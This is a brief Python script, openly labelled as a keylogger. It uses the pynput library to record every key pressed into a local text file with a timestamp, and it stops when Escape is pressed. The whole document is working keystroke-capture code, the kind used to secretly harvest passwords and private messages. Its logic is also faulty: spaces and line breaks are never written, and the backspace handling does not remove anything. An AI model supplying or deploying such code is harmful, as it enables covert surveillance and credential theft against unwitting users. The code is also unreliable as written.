from pynput import keyboard
import time,os
from pynput.keyboard import Key,Listener
print("[+][+] **KEY LOGGER STARTED**....")
file_name ="keylogger.txt"
file_write =open(file_name,'w')
cu_time =time.ctime(time.time())
file_write.write(cu_time)
file_write.write("\n")
file_write.write("**************************************************************************\n\n")

def on_press(key):
    new =str((key)).replace("'","")
    if new =="Key.space":
       new =str((key)).replace("Key.space"," ")
    elif new =="Key.esc":
         new =str((key)).replace("Key.esc","")
    elif new =="Key.enter":
         new =str((key)).replace("Key.enter","\n")
    elif new =="Key.backspace":
         file_write.seek(file_write.tell() - 1 ,os.SEEK_SET)
         file_write.write("")
    else:
        print(new)
        file_write.write(new)

def on_release(key):
    if str(key) == 'Key.esc':
       file_write.close()
       return False

with Listener(on_press=on_press,on_release=on_release) as listen:
    listen.join()
    
